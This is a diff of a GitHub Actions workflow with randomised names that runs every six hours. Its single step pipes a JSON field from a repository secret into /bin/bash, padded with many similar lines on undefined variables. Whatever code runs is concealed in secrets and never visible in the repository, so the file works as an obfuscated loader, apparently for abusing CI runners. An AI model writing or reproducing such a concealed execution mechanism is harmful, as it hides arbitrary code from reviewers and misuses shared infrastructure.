@@ -1,40 +1,32 @@
 name: zhaowushi4178
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 5/6 * * *'
+    - cron: '32 1/6 * * *'
 
-jobs:  # 22219
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhaowushi4178
         env:
-          v13: ${{ secrets.v13 }}
+          cmezi42859: ${{ secrets.cmezi42859 }}
         run: |
-          echo $v13 | jq -r .t3842 | /bin/bash
-          echo $rqn6860 | jq -r .thb50 | /bin/bash
-          echo $b7902 | jq -r .zpohw5 | /bin/bash
-          echo $i60175 | jq -r .he372 | /bin/bash
-          echo $os00 | jq -r .bw0400 | /bin/bash
-          echo $f884 | jq -r .ta97008 | /bin/bash
-          echo $qs79585 | jq -r .knh0 | /bin/bash
-          echo $k4142 | jq -r .oy72 | /bin/bash
-          echo $c44 | jq -r .onik223 | /bin/bash
-          echo $mnw6 | jq -r .tvjx5592 | /bin/bash
-          echo $gaw16203 | jq -r .bfj85947 | /bin/bash
-          echo $rsoao467 | jq -r .xnw9 | /bin/bash
-          echo $acor62677 | jq -r .boozd007 | /bin/bash
-          echo $s30132 | jq -r .xdch991 | /bin/bash
-          echo $mcy7760 | jq -r .dqb0220 | /bin/bash
-          echo $wxe0641 | jq -r .jmodl2333 | /bin/bash
-          echo $uauti33 | jq -r .dvf62555 | /bin/bash
-          echo $x7208 | jq -r .am127 | /bin/bash
-          echo $fy20 | jq -r .bsp9703 | /bin/bash
-          echo $qh642 | jq -r .vcpg098 | /bin/bash
-          echo $bshoz0 | jq -r .mgciy64621 | /bin/bash
-          echo $soc783 | jq -r .pkbqe3 | /bin/bash
+          echo $cmezi42859 | jq -r .gbi7117 | /bin/bash
+          echo $zm4509 | jq -r .fct84675 | /bin/bash
+          echo $vypq8 | jq -r .brncg56 | /bin/bash
+          echo $jvyqd94 | jq -r .jxmyz398 | /bin/bash
+          echo $m1 | jq -r .nef6990 | /bin/bash
+          echo $n3040 | jq -r .qh13 | /bin/bash
+          echo $gleji5618 | jq -r .aubn2 | /bin/bash
+          echo $syu335 | jq -r .f1 | /bin/bash
+          echo $w36 | jq -r .khue77 | /bin/bash
+          echo $fovdz694 | jq -r .f58215 | /bin/bash
+          echo $xdecv8434 | jq -r .oxmzm9 | /bin/bash
+          echo $ap3638 | jq -r .evt883 | /bin/bash
+          echo $ijxy75 | jq -r .nx8255 | /bin/bash
+          echo $lf09299 | jq -r .tg04 | /bin/bash
+          echo $dng2583 | jq -r .ay971 | /bin/bash
+          echo $wjw257 | jq -r .v34 | /bin/bash
 
